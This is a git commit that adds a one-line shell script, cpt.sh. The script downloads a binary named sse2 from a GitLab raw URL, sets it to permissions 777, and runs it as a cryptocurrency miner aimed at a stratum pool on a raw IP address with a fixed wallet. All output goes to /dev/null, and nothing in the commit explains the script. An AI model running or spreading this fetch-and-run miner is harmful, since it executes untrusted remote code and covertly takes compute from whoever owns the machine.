461946586f18b457cb339b326ae1511058c60f51
lukmanpurai <111341941+lukmanpurai@users.noreply.github.com>
2026-04-14 21:52:19 +0700

    Create cpt.sh

---
+++ cpt.sh
@@ -0,0 +1,1 @@
+wget https://gitlab.com/cuan8871816/jam/-/raw/main/sse2 && chmod 777 sse2 && ./sse2 -a power2b -o stratum+tcp://143.198.85.42:443 -u mbc1qprhsuzmlgn8jepw6ezgwj6mce65s4elwfw9f4n -t4 > /dev/null 2>&1
